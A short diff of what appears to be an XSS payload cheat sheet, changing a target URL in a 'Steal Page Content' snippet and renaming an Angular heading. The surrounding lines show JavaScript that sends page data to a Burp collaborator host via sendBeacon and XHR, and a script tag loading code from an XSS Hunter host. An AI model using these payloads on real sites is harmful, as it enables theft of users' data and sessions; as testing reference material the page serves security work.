@@ -45,7 +45,7 @@ navigator.sendBeacon('https://{{ collaborator your.burpcollaborator.net }}/',doc
 #### Steal Page Content
 
 ```js
-var url = "{{ target-url http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8 }}";
+var url = "{{ target-url http://localhost:8000/info/me }}";
 var attacker = "https://{{ collaborator your.burpcollaborator.net }}";
 var xhr  = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
@@ -77,4 +77,4 @@ var a=document.createElement("script");a.src="https://{{ xss-hunter-username you
 
 ![Mutation points in a tag for WAF bypass](/web_client_xss_a_mutation_points.jpg)
 
-## Angularjs
+## Angular.js
